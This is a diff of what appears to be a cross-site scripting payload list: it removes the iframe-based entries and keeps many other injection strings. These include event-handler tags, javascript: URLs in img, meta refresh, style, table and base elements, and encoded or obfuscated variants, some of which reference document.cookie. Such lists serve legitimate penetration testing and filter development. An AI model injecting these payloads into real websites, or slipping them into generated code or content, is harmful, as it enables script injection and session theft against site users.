@@ -25,7 +25,7 @@
 <script src=1 href=1 onerror="javascript:alert(1)"></script>
 <svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
 <title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
-<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
+
 <body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>
 <body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
 <frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>
@@ -41,7 +41,7 @@
 <html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>
 <html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>
 <style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>
-<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>
+
 <body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>
 <style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"></style onReadyStateChange>
 <frameset onFocus frameset onFocus="javascript:javascript:alert(1)"></frameset onFocus>
@@ -69,15 +69,15 @@
 <applet onerror applet onerror="javascript:javascript:alert(1)"></applet onerror>
 <body onkeyup body onkeyup="javascript:javascript:alert(1)"></body onkeyup>
 <body onunload body onunload="javascript:javascript:alert(1)"></body onunload>
-<iframe onload iframe onload="javascript:javascript:alert(1)"></iframe onload>
+
 <body onload body onload="javascript:javascript:alert(1)"></body onload>
 <html onmouseover html onmouseover="javascript:javascript:alert(1)"></html onmouseover>
 <object onbeforeload object onbeforeload="javascript:javascript:alert(1)"></object onbeforeload>
 <body onbeforeunload body onbeforeunload="javascript:javascript:alert(1)"></body onbeforeunload>
 <body onfocus body onfocus="javascript:javascript:alert(1)"></body onfocus>
 <body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>
-<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>
-<iframe src iframe src="javascript:javascript:alert(1)"></iframe src>
+
+
 <svg onload svg onload="javascript:javascript:alert(1)"></svg onload>
 <html onmousemove html onmousemove="javascript:javascript:alert(1)"></html onmousemove>
 <body onblur body onblur="javascript:javascript:alert(1)"></body onblur>
@@ -325,7 +325,7 @@ ABC<div style="x:\xE2\x80\x89expression(javascript:alert(1)">DEF
 <? foo="><x foo='?><script>javascript:alert(1)</script>'>">
 <! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(1)</script>">
 <% foo><x foo="%><script>javascript:alert(1)</script>">
-<div id=d><x xmlns="><iframe onload=javascript:alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>
+
 <img \x47src=x onerror="javascript:alert(1)">
 <img \x11src=x onerror="javascript:alert(1)">
 <img \x12src=x onerror="javascript:alert(1)">
@@ -406,7 +406,7 @@ X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
 <STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>window.document.cookie
 <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);">
 <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);">
-<IFRAME SRC="javascript:javascript:alert(1);"></IFRAME>
+
 <TABLE BACKGROUND="javascript:javascript:alert(1)">
 <TABLE><TD BACKGROUND="javascript:javascript:alert(1)">
 <DIV STYLE="background-image: url(javascript:javascript:alert(1))">
@@ -456,7 +456,7 @@ X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
 <STYLE type="text/css">BODY{background:url("javascript:alert('window.document.cookie')")}</STYLE>
 <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('window.document.cookie');">
 <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('window.document.cookie');">
-<IFRAME SRC="javascript:alert('window.document.cookie');"></IFRAME>
+
 <FRAMESET><FRAME SRC="javascript:alert('window.document.cookie');"></FRAMESET>
 <TABLE BACKGROUND="javascript:alert('window.document.cookie')">
 <TABLE><TD BACKGROUND="javascript:alert('window.document.cookie')">
@@ -477,13 +477,13 @@ X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
 javascript:alert("hellox worldss")
 <img src="javascript:alert('window.document.cookie');">
 <img src=javascript:alert(&quot;window.document.cookie&quot;)>
-<IFRAME SRC="javascript:alert('window.document.cookie');"></IFRAME>
+
 <form><button formaction="javascript:alert(window.document.cookie)">lol
 <IMG SRC="javascript:alert('window.document.cookie');">
 <IMG SRC=javascript:alert('window.document.cookie')>
 <IMG SRC=" &#14;  javascript:alert('window.document.cookie');">
 <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('window.document.cookie');">
-<IFRAME SRC="javascript:alert('window.document.cookie');"></IFRAME>
+
 <FRAMESET><FRAME SRC="javascript:alert('window.document.cookie');"></FRAMESET>
 <TABLE BACKGROUND="javascript:alert('window.document.cookie')">
 <TABLE><TD BACKGROUND="javascript:alert('window.document.cookie')">
@@ -492,7 +492,7 @@ javascript:alert("hellox worldss")
 <form><button formaction="javascript:alert(123)">crosssitespt
 <embed src="javascript:alert(1)">
 <svg onload="javascript:alert(123)" xmlns="#"></svg>
-<iframe xmlns="#" src="javascript:alert(1)"></iframe>
+
 <IMG SRC="javascript:alert('window.document.cookie');">
 <IMG SRC=javascript:alert('window.document.cookie')>
 <IMG SRC=javascript:alert("window.document.cookie")>
@@ -511,7 +511,7 @@ javascript:alert("hellox worldss")
 <STYLE type="text/css">BODY{background:url("javascript:alert('window.document.cookie')")}</STYLE>
 <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('window.document.cookie');">
 <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('window.document.cookie');">
-<IFRAME SRC="javascript:alert('window.document.cookie');"></IFRAME>
+
 <FRAMESET><FRAME SRC="javascript:alert('window.document.cookie');"></FRAMESET>
 <TABLE BACKGROUND="javascript:alert('window.document.cookie')">
 <TABLE><TD BACKGROUND="javascript:alert('window.document.cookie')">
@@ -519,10 +519,8 @@ javascript:alert("hellox worldss")
 <DIV STYLE="background-image: url(&#1;javascript:alert('window.document.cookie'))">
 <BASE HREF="javascript:alert('window.document.cookie');//">
 javascript:alert%281%29;
-"><h1><IFRAME SRC="javascript:alert('window.document.cookie');"></IFRAME>">123</h1>
-<IFRAME SRC="javascript:alert('window.document.cookie');"></IFRAME>
-"><h1><IFRAME SRC="javascript:alert('window.document.cookie');"></IFRAME>">123</h1>
-<IFRAME SRC="javascript:alert('window.document.cookie');"></IFRAME>
+
+
 <a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
 <marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
 <script\x20type="text/javascript">javascript:alert(1);</script>
@@ -543,7 +541,7 @@ javascript:alert%281%29;
 <script src=1 href=1 onerror="javascript:alert(1)"></script>
 <svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
 <title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
-<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
+
 <body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>
 <body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
 <frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>
@@ -559,7 +557,7 @@ javascript:alert%281%29;
 <html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>
 <html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>
 <style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>
-<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>
+
 <body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>
 <style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"></style onReadyStateChange>
 <frameset onFocus frameset onFocus="javascript:javascript:alert(1)"></frameset onFocus>
@@ -587,15 +585,14 @@ javascript:alert%281%29;
 <applet onerror applet onerror="javascript:javascript:alert(1)"></applet onerror>
 <body onkeyup body onkeyup="javascript:javascript:alert(1)"></body onkeyup>
 <body onunload body onunload="javascript:javascript:alert(1)"></body onunload>
-<iframe onload iframe onload="javascript:javascript:alert(1)"></iframe onload>
+
 <body onload body onload="javascript:javascript:alert(1)"></body onload>
 <html onmouseover html onmouseover="javascript:javascript:alert(1)"></html onmouseover>
 <object onbeforeload object onbeforeload="javascript:javascript:alert(1)"></object onbeforeload>
 <body onbeforeunload body onbeforeunload="javascript:javascript:alert(1)"></body onbeforeunload>
 <body onfocus body onfocus="javascript:javascript:alert(1)"></body onfocus>
 <body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>
-<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>
-<iframe src iframe src="javascript:javascript:alert(1)"></iframe src>
+
 <svg onload svg onload="javascript:javascript:alert(1)"></svg onload>
 <html onmousemove html onmousemove="javascript:javascript:alert(1)"></html onmousemove>
 <body onblur body onblur="javascript:javascript:alert(1)"></body onblur>
@@ -939,7 +936,7 @@ X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
 <STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>window.document.cookie
 <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);">
 <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);">
-<IFRAME SRC="javascript:javascript:alert(1);"></IFRAME>
+
 <TABLE BACKGROUND="javascript:javascript:alert(1)">
 <TABLE><TD BACKGROUND="javascript:javascript:alert(1)">
 <DIV STYLE="background-image: url(javascript:javascript:alert(1))">
@@ -969,7 +966,7 @@ X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
 <IMG SRC=&{javascript:alert(1);};>
 <a href="jav&#65ascript:javascript:alert(1)">test1</a>
 <a href="jav&#97ascript:javascript:alert(1)">test1</a>
-<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>">
+
 <IMG SRC="javascript:alert('window.document.cookie');">
 <IMG SRC=javascript:alert('window.document.cookie')>
 <IMG SRC=javascript:alert("window.document.cookie")>
@@ -989,7 +986,7 @@ X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
 <STYLE type="text/css">BODY{background:url("javascript:alert('window.document.cookie')")}</STYLE>
 <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('window.document.cookie');">
 <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('window.document.cookie');">
-<IFRAME SRC="javascript:alert('window.document.cookie');"></IFRAME>
+
 <FRAMESET><FRAME SRC="javascript:alert('window.document.cookie');"></FRAMESET>
 <TABLE BACKGROUND="javascript:alert('window.document.cookie')">
 <TABLE><TD BACKGROUND="javascript:alert('window.document.cookie')">
@@ -1014,7 +1011,7 @@ X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
 <STYLE>li {list-style-image: url(\"javascript:alert('window.document.cookie')\");}</STYLE><UL><LI>window.document.cookie
 <BASE HREF="javascript:alert('window.document.cookie');//">
 <INPUT TYPE="IMAGE" SRC="javascript:alert('window.document.cookie');">
-<iframe src="javascript:alert('window.document.cookie by \nwindow.document.cookie');"></iframe><marquee><h1>window.document.cookie by window.document.cookie</h1></marquee>
+
 <BODY BACKGROUND="javascript:alert('window.document.cookie')">
 <IMG SRC="javascript:alert('window.document.cookie');">
 <IMG DYNSRC="javascript:alert('window.document.cookie')">
@@ -1030,7 +1027,7 @@ X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
 &lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;window.document.cookie&apos;))&quot;&gt;
 &lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;window.document.cookie&apos;))&quot;&gt;
 &lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&apos;window.document.cookie&apos;);&quot;&gt;&lt;/FRAMESET&gt;
-&lt;IFRAME SRC=&quot;javascript:alert(&apos;window.document.cookie&apos;);&quot;&gt;&lt;/IFRAME&gt;
+
 &lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&apos;window.document.cookie&apos;);&quot;&gt;
 &lt;IMG SRC=&quot;javascript:alert(&apos;window.document.cookie&apos;);&quot;&gt;
 &lt;IMG SRC=javascript:alert(&apos;window.document.cookie&apos;)&gt;
@@ -1056,7 +1053,7 @@ X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
 <;DIV STYLE=";background-image: url(javascript:alert(';window.document.cookie';))";>;
 <;DIV STYLE=";background-image: url(&;#1;javascript:alert(';window.document.cookie';))";>;
 <;FRAMESET>;<;FRAME SRC=";javascript:alert(';window.document.cookie';);";>;<;/FRAMESET>;
-<;IFRAME SRC=";javascript:alert(';window.document.cookie';);";>;<;/IFRAME>;
+
 <;INPUT TYPE=";IMAGE"; SRC=";javascript:alert(';window.document.cookie';);";>;
 <;IMG SRC=";javascript:alert(';window.document.cookie';);";>;
 <;IMG SRC=javascript:alert(';window.document.cookie';)>;
